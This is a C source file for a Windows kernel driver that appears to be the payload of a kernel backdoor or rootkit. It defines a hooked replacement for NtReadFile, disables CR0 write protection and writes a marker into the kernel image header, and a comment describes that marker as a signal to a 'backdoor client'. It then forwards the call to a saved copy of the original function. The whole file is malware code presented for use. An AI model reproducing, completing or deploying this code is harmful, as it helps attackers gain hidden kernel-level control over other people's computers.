#include "stdafx.h"

// make crt functions inline
#pragma intrinsic(memcpy)

// write protect bit of CR0 register
#define CR0_WP 0x00010000

// size of the nt!NtReadFile() call stub
#define MAX_CALLGATE_LEN 0x40

typedef NTSTATUS (NTAPI * func_NtReadFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

PVOID m_Driver = NULL;

// callgate for original nt!NtReadFile()
UCHAR old_NtReadFile[MAX_CALLGATE_LEN];
//--------------------------------------------------------------------------------------
void wp_disable(void)
{
    // disable write protection
    _cr0_set(_cr0_get() & ~CR0_WP);
}

void wp_enable(void)
{
    // restore write protection
    _cr0_set(_cr0_get() | CR0_WP);
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverMain(void)
{
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\n");

    DbgMsg(__FILE__, __LINE__, "Kernel base address is "IFMT"\n", GetKernelBase());
    DbgMsg(__FILE__, __LINE__, "Driver base address is "IFMT"\n", m_Driver);

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI new_NtReadFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    PVOID KernelBase = NULL;

    if ((KernelBase = GetKernelBase()) != NULL)
    {
        PIMAGE_DOS_HEADER pHeader = (PIMAGE_DOS_HEADER)KernelBase;

        // check if handler was already executed
        if (pHeader->e_res[0] == 0x0000)
        {
            DriverMain();
        }        

        wp_disable();

        // notify backdoor client that DriverMain() was executed
        pHeader->e_res[0] = 0xffff;

        wp_enable();
    }    

    // call original function
    return ((func_NtReadFile)&old_NtReadFile)(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        Buffer,
        Length,
        ByteOffset,
        Key
    );
}
//--------------------------------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject)
{   
    // ...
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    DriverObject->DriverUnload = DriverUnload;

    return DriverMain();
}
//--------------------------------------------------------------------------------------
// EoF
